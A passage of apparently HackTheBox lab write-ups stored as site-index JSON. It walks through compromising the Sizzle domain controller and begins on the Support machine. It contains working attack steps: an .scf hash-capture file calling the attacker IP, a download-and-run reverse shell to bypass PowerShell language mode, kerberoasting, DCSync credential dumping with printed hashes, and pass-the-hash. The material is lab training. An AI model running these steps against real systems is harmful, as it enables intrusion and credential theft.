jose\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 lkys37en\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 morgan\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 mrb3n\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Public\n\u2514\u2500\u2500 ZZ_ARCHIVE\n    \u251c\u2500\u2500 AddComplete.pptx\n    \u251c\u2500\u2500 AddMerge.ram\n    \u251c\u2500\u2500 ConfirmUnprotect.doc\n    \u251c\u2500\u2500 ConvertFromInvoke.mov\n    \u251c\u2500\u2500 ConvertJoin.docx\n    \u251c\u2500\u2500 CopyPublish.ogg\n    \u251c\u2500\u2500 DebugMove.mpg\n    \u251c\u2500\u2500 DebugSelect.mpg\n    \u251c\u2500\u2500 DebugUse.pptx\n    \u251c\u2500\u2500 DisconnectApprove.ogg\n    \u251c\u2500\u2500 DisconnectDebug.mpeg2\n    \u251c\u2500\u2500 EditCompress.xls\n    \u251c\u2500\u2500 EditMount.doc\n    \u251c\u2500\u2500 EditSuspend.mp3\n    \u251c\u2500\u2500 EnableAdd.pptx\n    \u251c\u2500\u2500 EnablePing.mov\n    \u251c\u2500\u2500 EnableSend.ppt\n    \u251c\u2500\u2500 EnterMerge.mpeg\n    \u251c\u2500\u2500 ExitEnter.mpg\n    \u251c\u2500\u2500 ExportEdit.ogg\n    \u251c\u2500\u2500 GetOptimize.pdf\n    \u251c\u2500\u2500 GroupSend.rm\n    \u251c\u2500\u2500 HideExpand.rm\n    \u251c\u2500\u2500 InstallWait.pptx\n    \u251c\u2500\u2500 JoinEnable.ram\n    \u251c\u2500\u2500 LimitInstall.doc\n    \u251c\u2500\u2500 LimitStep.ppt\n    \u251c\u2500\u2500 MergeBlock.mp3\n    \u251c\u2500\u2500 MountClear.mpeg2\n    \u251c\u2500\u2500 MoveUninstall.docx\n    \u251c\u2500\u2500 NewInitialize.doc\n    \u251c\u2500\u2500 OutConnect.mpeg2\n    \u251c\u2500\u2500 PingGet.dot\n    \u251c\u2500\u2500 ReceiveInvoke.mpeg2\n    \u251c\u2500\u2500 RemoveEnter.mpeg3\n    \u251c\u2500\u2500 RemoveRestart.mpeg\n    \u251c\u2500\u2500 RequestJoin.mpeg2\n    \u251c\u2500\u2500 RequestOpen.ogg\n    \u251c\u2500\u2500 ResetCompare.avi\n    \u251c\u2500\u2500 ResetUninstall.mpeg\n    \u251c\u2500\u2500 ResumeCompare.doc\n    \u251c\u2500\u2500 SelectPop.ogg\n    \u251c\u2500\u2500 SuspendWatch.mp4\n    \u251c\u2500\u2500 SwitchConvertFrom.mpg\n    \u251c\u2500\u2500 UndoPing.rm\n    \u251c\u2500\u2500 UninstallExpand.mp3\n    \u251c\u2500\u2500 UnpublishSplit.ppt\n    \u251c\u2500\u2500 UnregisterPing.pptx\n    \u251c\u2500\u2500 UpdateRead.mpeg\n    \u251c\u2500\u2500 WaitRevoke.pptx\n    \u2514\u2500\u2500 WriteUninstall.mp3\n\n52 directories, 51 files  \n\n$ kerbrute userenum --dc 10.10.10.103 -d htb.local -t 60 users\n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 11/24/24 - Ronnie Flathers @ropnop\n\n2024/11/24 17:39:05 &gt;  Using KDC(s):\n2024/11/24 17:39:05 &gt;   10.10.10.103:88\n\n2024/11/24 17:39:05 &gt;  [+] VALID USERNAME:       amanda@htb.local\n2024/11/24 17:39:05 &gt;  Done! Tested 12 usernames (1 valid) in 0.051 seconds\n</code></pre> <p>We got <code>amanda</code>.</p> <p>Let's enumerate folder permissions to find a write permission. We can write in <code>Public</code>.</p> <pre><code>$ sudo mount -t cifs //10.10.10.103/Department\\ shares mount                                \nPassword for root@//10.10.10.103/Department shares: \n\n$ sudo touch mount/Users/Public/asdf.txt\n</code></pre> <p>But we can search all the writable folders with a little bash one-liner.</p> <pre><code>$ for directory in $(ls Users); do echo -e \"\\n[+] Enumerating $directory perms:\\n\"; echo -e \"\\t$(smbcacls \"//10.10.10.103/Department Shares\" Users/$directory -N | grep \"Everyone\")\"; done;\n\n[+] Enumerating amanda perms:\n        ACL:Everyone:ALLOWED/OI|CI|I/READ\n[+] Enumerating amanda_adm perms:\n        ACL:Everyone:ALLOWED/OI|CI|I/READ\n[+] Enumerating bill perms:\n        ACL:Everyone:ALLOWED/OI|CI|I/READ\n[+] Enumerating bob perms:\n        ACL:Everyone:ALLOWED/OI|CI|I/READ\n[+] Enumerating chris perms:\n        ACL:Everyone:ALLOWED/OI|CI|I/READ\n[+] Enumerating henry perms:\n        ACL:Everyone:ALLOWED/OI|CI|I/READ\n[+] Enumerating joe perms:\n        ACL:Everyone:ALLOWED/OI|CI|I/READ\n[+] Enumerating jose perms:\n        ACL:Everyone:ALLOWED/OI|CI|I/READ\n[+] Enumerating lkys37en perms:\n        ACL:Everyone:ALLOWED/OI|CI|I/READ\n[+] Enumerating morgan perms:\n        ACL:Everyone:ALLOWED/OI|CI|I/READ\n[+] Enumerating mrb3n perms:\n        ACL:Everyone:ALLOWED/OI|CI|I/READ\n[+] Enumerating Public perms:\n        ACL:Everyone:ALLOWED/OI|CI/FULL\nACL:Everyone:ALLOWED/OI|CI|I/READ\n</code></pre> <p>There is another way without using <code>smbcacls</code>, only trying to write in every folder</p> <pre><code>$ for directory in $(find . -type d); do sudo touch \"$directory/file\" 2&gt;/dev/null &amp;&amp; echo -e \"\\033[32m[+] $directory is WRITABLE\\033[0m\" || echo -e \"\\033[31m[-] $directory is not writable\\033[0m\"; sudo rm -f \"$directory/file\" 2&gt;/dev/null; done\n[-] . is not writable\n[-] ./Accounting is not writable\n[-] ./Audit is not writable\n[-] ./Banking is not writable\n...\n[-] ./Users/bob is not writable\n[-] ./Users/chris is not writable\n[-] ./Users/henry is not writable\n[-] ./Users/joe is not writable\n[-] ./Users/jose is not writable\n[-] ./Users/lkys37en is not writable\n[-] ./Users/morgan is not writable\n[-] ./Users/mrb3n is not writable\n[+] ./Users/Public is WRITABLE\n[+] ./ZZ_ARCHIVE is WRITABLE\n</code></pre> <p>And we have <code>/Users/Public</code> and <code>ZZ_ARCHIVE</code>.</p> <p>We can try to steal the NTLM hash by saving a <code>.scf</code> file (reference).</p> <p>So we save a <code>test.scf</code> in a writable folder and create a <code>smbshare</code></p> <pre><code>[Shell]\nCommand=2\nIconFile=\\\\10.10.14.11\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n</code></pre> <pre><code>$ impacket-smbserver -smb2support asdf .\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (10.10.10.103,59825)\n[*] AUTHENTICATE_MESSAGE (HTB\\amanda,SIZZLE)\n[*] User SIZZLE\\amanda authenticated successfully\n[*] amanda::HTB:aaaaaaaaaaaaaaaa:f670b845ca06fb08959be34b74a9908e:01010000000000008045a5fba53edb01080d98e9f223bde80000000001001000620073006f00740045004d004300490003001000620073006f00740045004d00430049000200100068004c005a006f00730061004a004f000400100068004c005a006f00730061004a004f00070008008045a5fba53edb01060004000200000008003000300000000000000001000000002000006104689ba8c07c3d121e984d7faf1cde5dbad9557373c9d817fc26be20346c6e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003100000000000000000000000000\n[*] Connecting Share(1:IPC$)\n[-] SMB2_TREE_CONNECT not found test.ico\n[-] SMB2_TREE_CONNECT not found test.ico\n[*] Disconnecting Share(1:IPC$)\n[*] Closing down connection (10.10.10.103,59825)\n[*] Remaining connections []\n</code></pre> <p>We have the hash for <code>amanda</code>, using <code>hashcat</code>:</p> <pre><code>$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt \nhashcat (v6.2.6) starting\n\nAMANDA::HTB:aaaaaaaaaaaaaaaa:f670b845ca06fb08959be34b74a9908e:01010000000000008045a5fba53edb01080d98e9f223bde80000000001001000620073006f00740045004d004300490003001000620073006f00740045004d00430049000200100068004c005a006f00730061004a004f000400100068004c005a006f00730061004a004f00070008008045a5fba53edb01060004000200000008003000300000000000000001000000002000006104689ba8c07c3d121e984d7faf1cde5dbad9557373c9d817fc26be20346c6e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003100000000000000000000000000:Ashare1972\n\nSession..........: hashcat\n</code></pre> <p>We have <code>amanda:Ashare1972</code>.</p> <p><code>Evil winrm</code> doesn't work but there is an SSL version, so we would need a certificate. Enumerating directories with the <code>iis</code> wordlist, we have a <code>/certsrv</code> that asks for user and password. We try <code>amanda</code>'s one.</p> <p></p> <p>We can generate a private key and a CSR and have the CA sign it.</p> <pre><code>$ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr \n......+.....+.........+....+......+........+.+.........+.....+.+...........+...+...+....+++++++++++++++++++++++++++++++++++++++*.....+...+.....+...+...+....+..+.+.....+..........+..+..........+..+...+......+.+...+......+.....+....+...........+......+.+..+.+.....+.+........+............+....+..+.............+..+.........+...+...+++++++++++++++++++++++++++++++++++++++*..+............+...+......+.......+.....+...+...................+...+..+.+..+.........+....+..+..........+...+......+...+..++++++\n..+....+..+.........+++++++++++++++++++++++++++++++++++++++*..+....+.........+...+..+.........................+..+.+.....+....+.........+..+....+......+..+...+....+.....+...+...............+...+....+...+..+++++++++++++++++++++++++++++++++++++++*................+.........+.+......+......+........+.+...+...+..+..........+..+.............+..+...+.+..+....+...............+...+...........+.+.....+...+.+......+.........+..+...+......+...+......+........................+.......+.....+....+..+....+...+...+.....+.........+.+..+.......+.....+......+....+.....+...+.......+.........+.........+........+.........+...+.+..+....+...+........+.......+......+............+.....+.........+.........+.......+........+....+......+......+...+......+..+....+......+..+...+.......+...+..+.......+.........+......+...+..+.....................+...+....+.....+...+....+...+.....+..........+......+.....+......+....+............+...+...........+.+..+...+...+......+.+............+...+.........+........+.+.....+.......+.....+.......+.....+......+.......+........+.+...........+...+..........+.....+...................+.....+.+.....+....+......+..+....+........+............+.+..+...+....+.....+...+.......+...+......+..+.........+...+...+............+...+.......+......+...........+.+...............+...+..+.........+..........+...+......+............+..+..........+...........+....+.....+......+......+..........+........+......+....+........+.........+......+...+....+...+...+.........+..+........................+....+..+.+...+.....+.+........+.+..+....+........+...+....+..............+....+..+......+....+........+......+.+........+..........+..+.+..+......................+.....+.+..+............+.+...+.........+...+..+.+..+.............+...............+.....+.+..............+......+...+...+...+....+........+...+....+...............+...+..+.+......+...+..+......+....+.......................+.............+..+...+....+......+.........+.....+.+...+.....+............+....+...+..++++++\n-----\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:\nState or Province Name (full name) [Some-State]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:\nEmail Address []:\n\nPlease enter the following 'extra' attributes\nto be sent with your certificate request\nA challenge password []:\nAn optional company name []:\n</code></pre> <p>Paste the CSR to the webpage and get the signed cert.</p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"sizzle/#initial-access","title":"Initial Access","text":"<pre><code>$ evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103\n\nEvil-WinRM shell v3.7\n\n\nWarning: SSL enabled\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\amanda\\Documents&gt; whoami\namanda\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"sizzle/#privilege-escalation","title":"Privilege Escalation","text":"<p>So at this point with these creds, try to make a kerberoast attack. The problem is that Kerberos <code>port 88</code> is not open, so let's try from inside, with <code>Rubeus</code></p> <pre><code>*Evil-WinRM* PS C:\\Users\\amanda\\Documents&gt; upload /home/kali/Downloads/Rubeus.exe\n\nInfo: Uploading /home/kali/Downloads/Rubeus.exe to C:\\Users\\amanda\\Documents\\Rubeus.exe\n\nError: Upload failed. Check filenames or paths: [WinRM::FS::Core::FileTransporter] Upload failed (exitcode: 0), but stderr present                                                                \nCannot invoke method. Method invocation is supported only on core types in this language mode.   \nAt line:51 char:12                                                                               \n+     return $ExecutionContext.SessionState.Path.GetUnresolvedProviderP ...                      \n+            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                          \n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException              \n</code></pre> <p>We have a problem: PowerShell is not in full language mode, so we have to bypass it. https://github.com/padovah4ck/PSByPassCLM</p> <pre><code>*Evil-WinRM* PS C:\\Users\\amanda\\Documents&gt; Invoke-WebRequest -Uri http://10.10.14.11:8000/PsBypassCLM.exe -OutFile .\\bypass.exe\n*Evil-WinRM* PS C:\\Users\\amanda\\Documents&gt; ls\n\n\n    Directory: C:\\Users\\amanda\\Documents\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       11/24/2024   7:26 PM          33792 bypass.exe\n\n\n*Evil-WinRM* PS C:\\Users\\amanda\\Documents&gt; $ExecuteContext.SessionState.LanguageMode\n*Evil-WinRM* PS C:\\Users\\amanda\\Documents&gt; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.11 /rport=443 /U ./bypass.exe\nMicrosoft (R) .NET Framework Installation utility Version 4.6.1586.0\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\n\n\nThe uninstall is beginning.\nSee the contents of the log file for the C:\\Users\\amanda\\Documents\\bypass.exe assembly's progress.\nThe file is located at .\nUninstalling assembly 'C:\\Users\\amanda\\Documents\\bypass.exe'.\nAffected parameters are:\n   assemblypath = C:\\Users\\amanda\\Documents\\bypass.exe\n   rport = 443\n   revshell = true\n   rhost = 10.10.14.11\n   logtoconsole = true\n   logfile =\nTrying to connect back...\n</code></pre> <p>And we have a shell with full language mode. Now back to uploading <code>Rubeus</code>.</p> <pre><code>PS C:\\Temp&gt; .\\Rubeus.exe\nERROR: Program 'Rubeus.exe' failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1\n+ .\\Rubeus.exe\n+ ~~~~~~~~~~~~.\n</code></pre> <p>A policy doesn't allow us to execute apps. Let's examine it.</p> <pre><code>PS C:\\&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n\nPublisherConditions : {*\\*\\*,0.0.0.0-*}\nPublisherExceptions : {}\nPathExceptions      : {}\nHashExceptions      : {}\nId                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba\nName                : (Default Rule) All signed packaged apps\nDescription         : Allows members of the Everyone group to run packaged apps that are signed.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {%WINDIR%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51\nName                : (Default Rule) All files located in the Windows folder\nDescription         : Allows members of the Everyone group to run applications that are located in the Windows folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n...\n</code></pre> <p>So inside <code>windows</code> we can do it from <code>C:\\Windows\\Temp</code>, that is allowed.</p> <pre><code>PS C:\\Windows\\Temp&gt; .\\Rubeus.exe kerberoast /creduser:htb.local\\amanda /credpassword:Ashare1972\n\n   ______        _                      \n  (_____ \\      | |                     \n   _____) )_   _| |__  _____ _   _  ___ \n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.0 \n\n\n[*] Action: Kerberoasting\n\n[*] NOTICE: AES hashes will be returned for AES-enabled accounts.\n[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\n\n[*] Target Domain          : HTB.LOCAL\n[*] Searching path 'LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL' for '(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'\n\n[*] Total kerberoastable users : 1\n\n\n[*] SamAccountName         : mrlky\n[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL\n[*] ServicePrincipalName   : http/sizzle\n[*] PwdLastSet             : 7/10/2018 2:08:09 PM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$B843F2F587CA377E97B56A34C3B8\n                             B9E8$A8B1D51210F29B6A4C437AF49795465B133886A97FA1EA54EC28D9169CF5587D5858ABBBA54\n                             0700378F4334492DE8A042F63A4D11BD1B2B14A9D0D419D22F093DE334EC0F6329C658BF5E325CCA\n                             A008A889466985631318810816024078E24AFFECFA26D67555C646160CDBEEE7B14FA2C8FEC2F225\n                             10A144FA2489CDDE8C61A2FBF31FA73F63C8D40849E3F768A2686CB7A20E3ACDC9D321A411030B4A\n                             4985CADCBEE22F86E60C524FCE3ADB5B8C01FEACB8AE6FAAA7F81B2952DC879DBC1E0018A78E33BE\n                             794EA70324C7505344E4F710E801D84446FEBD9CE4DC6AA863639E0D4078D62F50E486FF8ED200E3\n                             6AF060C399F61CAB83EA2BC87576CE5D126FB049F5461F08268CCC0FBA635D88C8087B1D5CEE5C71\n                             9F282D702EF68BA5880DADA2B5EBC3ACBC3CB7F038496CD0FB523A49D1F68161304818F44D629923\n                             F9160881D55D67C51443341636C50720851710A437EE7FDC70838F494E7096708D83E002D1FB4AF4\n                             88FF5F9C7A01F520A68C75DD2E050C37398C6DB4B14292B4DC3E81A7003FAE5CDB3D0D749C51ACBC\n                             CAD0E53C7B846EE5852E54BD558BD54FA18E61B26571E02A33404EDE83E5524742B62B271F973C08\n                             4619853B877622EC93767F3950A8304846DB73D6402C54943113BB10EFC5F35AAEB7D47CDFAEA0FD\n                             B2E948AC0C781D72EB5FBD0B9B9F4760422C393927026C92576D7F5AE7E0EA888D4E0691F168B3EB\n                             C36D722D03846CF9D2090AD171AFEBF213D2624173FD570E787A2E1FCEB77BA4D0F96AFE98A16C57\n                             263A464E29DA2D443163759495FA9FE4431483B1363A8FA9F64E1A815E7CBB6AEBDFE111124208C6\n                             B8EFF6584EDBE2FAA5B0D9505DFA521A2113FCF34D2ABEA7D34038F764AC2FCA6DDEED83F35E0562\n                             444D192375B2CB9AB803E6E1295C1505BEAF8152DD1F6E2931E4E2636C8C4945B16AC9C9AE661CC3\n                             CAF42349BD87EA0AA4498A982073E8AD63EA1B7230060A6871ADEBABAE07F03C04C5A6BD027D9CB6\n                             11C0B7A4BC23A94A5EA93E5DAE0F1302131D183D91CEDCA4238B1F3E80C2FFC9C70161262D0D886F\n                             32B6056233A6ACC02E21B499D39D05AE7BF5DC24CF4D799092B7EBE04941D43DD1D2ECAF7AD96474\n                             2AE8C726C7C2A1FCAF371161654E2D2382DB9F5831065E7F068528386FCD6153ECE0903104096C66\n                             1A46288B6A61E5CDC1586C0586E6B26E561354CB01FA2041E7F835DD2CB30D3E5AC2283432D9430C\n                             82E227AC0E6CA48655EC3B1DE119E9F42435D4E5F418C6C879521A42BBCD255426B1B2700C8C3F0D\n                             78CB51F7C5760EC028CE8590D6B4EFC97ADBE59BBC488F40A6DD671BDF0B3AB2AFEFA1003BAD5304\n                             D8D5DE739B47E7E63\n</code></pre> <p>Using john</p> <pre><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt hash \nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nFootball#7       (?)     \n1g 0:00:00:08 DONE (2024-11-25 02:29) 0.1121g/s 1251Kp/s 1251Kc/s 1251KC/s Forever3!..FokinovaS1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p>Execute secretsdump because mrlky can DCSync the domain.</p> <pre><code>$ impacket-secretsdump htb.local/mrlky:'Football#7'@10.10.10.103\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\namanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::\nmrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::\nsizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::\nSIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:2f5618088c1dd4385ae90c7059ee55e1:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d\nAdministrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3\nAdministrator:des-cbc-md5:ad7afb706715e964\nkrbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e\nkrbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699\nkrbtgt:des-cbc-md5:866db35eb9ec5173\namanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb\namanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061\namanda:des-cbc-md5:70ba677a4c1a2adf\nmrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155\nmrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0\nmrlky:des-cbc-md5:02f1a4da0432f7f7\nsizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d\nsizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955\nsizzler:des-cbc-md5:5d51d30e68d092d9\nSIZZLE$:aes256-cts-hmac-sha1-96:5153f5f25282b40841bc7947d928c18260901c77416cd5c924d032e418d7eed3\nSIZZLE$:aes128-cts-hmac-sha1-96:8626d10ebb7862f2580530a3a67110fa\nSIZZLE$:des-cbc-md5:4f8046b0f24629b9\n[*] Cleaning up... \n</code></pre> <p>Now with PTH using wmiexec</p> <pre><code>$ impacket-wmiexec htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands\nC:\\&gt;whoami\nhtb\\administrator\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"sizzle/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flags</p> <pre><code>C:\\&gt;cd Users\n\nC:\\Users&gt;type mrlky\\Desktop\\user.txt\nf16365e4fbe29048b3600659b801946a\n\nC:\\Users&gt;type administrator\\Desktop\\root.txt\n6edbcfac09ce51ebaea5d853dc85af4b\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"support/","title":"Support","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"support/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.174\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 17:48 CET\nNmap scan report for 10.10.11.174\nHost is up (0.040s latency).\nNot shown: 65517 filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-26 16:48:53Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49664/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49678/tcp open  msrpc         Microsoft Windows RPC\n49699/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 2s\n| smb2-time: \n|   date: 2024-11-26T16:49:45\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 122.46 seconds\n</code></pre> <p>We have <code>smb</code> shares</p> <pre><code>$ smbclient -U \"\" -L //10.10.11.174   \nPassword for [WORKGROUP\\]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        support-tools   Disk      support staff tools\n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\n$ smbclient -U \"\" //10.10.11.174/support-tools  \nPassword for [WORKGROUP\\]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Wed Jul 20 19:01:06 2022\n  ..                                  D        0  Sat May 28 13:18:25 2022\n  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022\n  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022\n  putty.exe                           A  1273576  Sat May 28 13:20:06 2022\n  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022\n  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022\n  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022\n  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022\n\n                4026367 blocks of size 4096. 971514 blocks available\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"support/#initial-access","title":"Initial Access","text":"<p><code>UserInfo.exe</code> seems like an internal program, let's see its interior with <code>dotPeek</code></p> <p></p> <p>We have an encrypted password and an encoding key, so we have to execute that same function.</p> <pre><code>using System;\nusing System.Text;\n\n\nclass Protected\n{\n    private static string enc_password = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\";\n    private static byte[] key = Encoding.ASCII.GetBytes(\"armando\");\n\n    public static string getPassword()\n    {\n        byte[] numArray = Convert.FromBase64String(Protected.enc_password);\n        byte[] bytes = numArray;\n        for (int index = 0; index &lt; numArray.Length; ++index)\n        bytes[index] = (byte) ((int) numArray[index] ^ (int) Protected.key[index % Protected.key.Length] ^ 223);\n        return Encoding.Default.GetString(bytes);\n    }\n    static void Main()\n    {\n        Console.WriteLine(getPassword());\n    }\n}\n</code></pre> <p>Put it in a <code>.cs</code> file in a folder, install <code>dotnet</code> if not installed and</p> <pre><code>csc program.cs\ndotnet run\n</code></pre> <pre><code>C:\\Users\\win\\Desktop&gt;dotnet run\nnvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz\n</code></pre> <p>If we inspect the function where the <code>ldap</code> connection is called:</p> <p></p> <p>The user is <code>support\\ldap</code>, so we can use <code>ldapsearch</code> to enumerate all the users</p> <pre><code>$ ldapsearch -x 